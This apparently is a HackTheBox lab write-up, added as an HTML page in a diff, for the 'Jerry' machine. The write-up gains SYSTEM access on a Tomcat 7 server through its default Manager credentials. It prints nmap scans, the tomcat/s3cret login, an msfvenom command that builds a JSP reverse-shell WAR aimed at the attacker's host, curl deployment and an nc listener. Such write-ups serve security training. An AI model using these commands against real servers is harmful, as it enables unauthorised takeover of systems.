@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>jerry.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index-en.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Back
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../../pt-br/writeups/hackthebox/machines/jerry.html" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../../en-us/writeups/hackthebox/machines/jerry.html" class="active" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Jerry</h1>
+         <p class="meta">
+            HackTheBox &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Jerry exposes the <b>Tomcat Manager</b> with <b>default credentials</b>. The Manager lets us deploy a WAR file, and Tomcat runs as <b>SYSTEM</b>, so deploying a malicious WAR hands over the whole box.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Attack path</figcaption>
+            <svg viewBox="0 0 660 84" role="img" aria-label="Attack path" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconnaissance</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Exploitation - WAR deploy</tspan></text></svg>
+         </figure>
+
+         <h2>Reconnaissance</h2>
+
+         <p>Only port 8080 answers, with <b>Apache Tomcat 7.0.88</b>.</p>
+
+         <pre class="code-block"><code>nmap -Pn -n -sT --min-rate 1500 -p- &lt;IP&gt;
+nmap -Pn -n -sT -sV -sC -p8080 &lt;IP&gt;
+# 8080 Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 7.0.88)</code></pre>
+
+         <p><i>/manager/html</i> asks for basic auth. If we cancel, Tomcat's own 401 page shows the sample config with <code>tomcat</code> / <code>s3cret</code>, which was never changed. Metasploit's <i>tomcat_mgr_login</i> reaches the same pair by trying the default list.</p>
+
+         <pre class="code-block"><code>curl -s -u tomcat:s3cret http://&lt;IP&gt;:8080/manager/text/list
+# OK - Listed applications for virtual host localhost</code></pre>
+
+         <h2>Exploitation - WAR deploy</h2>
+
+         <p>We build a WAR with a JSP reverse shell and deploy it through the Manager's text interface. Requesting the app triggers the connection, already as <b>NT AUTHORITY\SYSTEM</b>.</p>
+
+         <pre class="code-block"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;MY_IP&gt; LPORT=4444 -f war -o shell.war
+curl -u tomcat:s3cret --upload-file shell.war &quot;http://&lt;IP&gt;:8080/manager/text/deploy?path=/shell&quot;
+nc -lvnp 4444
+curl http://&lt;IP&gt;:8080/shell/</code></pre>
+
+         <p>Both flags are in the same file, on the Administrator's desktop.</p>
+
+         <pre class="code-block"><code>whoami   # nt authority\system
+type &quot;C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt&quot;</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
